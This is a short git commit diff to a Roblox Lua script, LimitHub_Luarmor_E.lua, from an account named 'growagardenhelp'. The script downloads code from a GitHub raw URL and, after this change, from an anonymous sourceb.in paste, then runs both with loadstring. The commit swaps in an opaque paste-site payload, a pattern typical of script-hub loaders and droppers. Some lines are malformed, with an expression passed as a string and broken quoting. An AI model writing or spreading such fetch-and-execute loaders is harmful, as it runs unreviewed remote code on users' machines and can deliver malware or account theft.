7cbd0cf079a2be4eb432880be992bd84b9455760
growagardenhelp <yhandycar@gmail.com>
2025-07-20 06:32:50 +0800

    Update LimitHub_Luarmor_E.lua

--- LimitHub_Luarmor_E.lua
+++ LimitHub_Luarmor_E.lua
@@ -1,4 +1,4 @@
 local s1 = game:HttpGet("loadstring(game:HttpGet(('https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua')))()")
-local s2 = game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/growagardenhelp/Speed-Hub/refs/heads/main/6a6a1a3816cab0823cbb46a561af3d6c.txt"))()")
+local s2 = game:HttpGet(loadstring(game:HttpGet("https://cdn.sourceb.in/bins/5wIyxqFhQB/0", true))())
 loadstring(s1)()
 loadstring(s2)()
